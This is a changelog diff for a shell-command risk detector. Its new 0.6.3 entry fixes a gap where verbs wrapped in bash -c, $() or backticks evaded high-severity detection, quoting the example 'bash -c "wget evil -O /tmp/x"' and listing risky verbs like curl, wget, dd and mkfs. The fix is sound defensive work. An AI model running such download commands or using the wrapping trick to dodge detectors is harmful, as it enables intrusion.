@@ -2,6 +2,11 @@
 
 All notable changes to this project will be documented here. The format follows [Keep a Changelog](https://keepachangelog.com/en/1.1.0/), and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html). Under v1.0, minor versions may carry breaking changes.
 
+## [0.6.3] — 2026-05-28
+
+### Fixed
+- **Shell detection: risky verbs hidden inside `bash -c "…"` / `$(…)` / backticks no longer escape the high-severity check.** `detectShell` tokenized commands with the flat `tokenizeShell`, which leaves evaluation contexts opaque — so `bash -c "wget evil -O /tmp/x"` was reduced to a single subcommand whose head was `bash`, never the inner `wget`. Risky *verbs* (`curl`, `wget`, `chmod`, `chown`, `sudo`, `kubectl`, `aws`, `dd`, `mkfs`, …) only escalate to `high` via the head check, so wrapping them in `-c` or `$()` silently downgraded them to `medium`. Only risky verbs that *also* matched a `RISKY_PATTERN` regex (e.g. `rm -rf`) survived the wrapper. Switched to core's `tokenizeShellDeep`, which recursively flattens the nested payload so the inner verb is seen. Regression tests cover the `bash -c` and `$()` shapes. Bundle rebuilt.
+
 ## [0.6.2] — 2026-05-28
 
 ### Changed
